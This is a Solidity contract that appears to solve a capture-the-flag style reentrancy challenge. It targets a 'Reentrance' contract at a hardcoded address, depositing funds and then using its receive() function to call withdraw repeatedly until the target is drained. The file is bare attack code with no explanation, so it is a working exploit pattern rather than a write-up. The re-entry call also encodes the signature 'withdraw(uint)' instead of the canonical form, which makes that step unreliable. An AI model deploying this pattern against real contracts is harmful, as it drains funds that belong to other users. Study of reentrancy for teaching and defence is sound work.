
interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}


contract AnotherReentrancy {

    Reentrance public hacked;
    uint256 public value;

    constructor() {
        hacked = Reentrance(0xeA6209b403B7094026D1F5B3aaa574483b0feE67);      
    }

    function donate() public payable {
        value = msg.value;
        hacked.donate{value: value}(address(this));
    }

    function withdraw() public {
        hacked.withdraw(value);
        require(address(hacked).balance == 0);
    }

    function justWithdraw() public{
        hacked.withdraw(value);
    }

    receive() external payable {
        if (address(hacked).balance > 0) {
            address(hacked).call(abi.encodeWithSignature("withdraw(uint)", value));
        }
    }
}